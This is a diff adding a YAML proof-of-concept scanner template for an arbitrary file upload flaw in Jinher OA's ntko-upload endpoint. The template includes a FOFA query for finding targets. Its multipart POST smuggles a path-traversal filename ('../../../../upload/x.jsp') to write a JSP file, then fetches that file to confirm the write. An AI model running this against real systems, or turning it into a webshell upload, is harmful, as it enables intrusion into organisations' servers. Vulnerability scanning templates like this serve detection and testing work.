@@ -1,0 +1,45 @@
+id: poc-yaml-jinher-oa-ntko-upload-anyfile-upload
+info:
+  name: 金和OA ntko-upload 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 金和OA 协同办公管理系统
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_str(4)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /jc6/ntkoUpload/ntko-upload!upload.action
+  headers:
+    Content-Type: multipart/form-data; boundary=----zqulxi4ku42pfmoelvc0
+  data: '------zqulxi4ku42pfmoelvc0
+
+    Content-Disposition: form-data; name="filename"
+
+
+    ../../../../upload/{{.t1}}.jsp
+
+    ------zqulxi4ku42pfmoelvc0
+
+    Content-Disposition: form-data; name="upLoadFile"; filename="{{.t1}}.jpg"
+
+    Content-Type: image/jpeg
+
+
+    {{.t2}}
+
+    ------zqulxi4ku42pfmoelvc0
+
+    Content-Disposition: form-data; name="Submit"
+
+
+    upload
+
+    ------zqulxi4ku42pfmoelvc0--'
+  expression: status_code == 200 && body == "ok"
+- method: GET
+  path: /upload/{{.t1}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
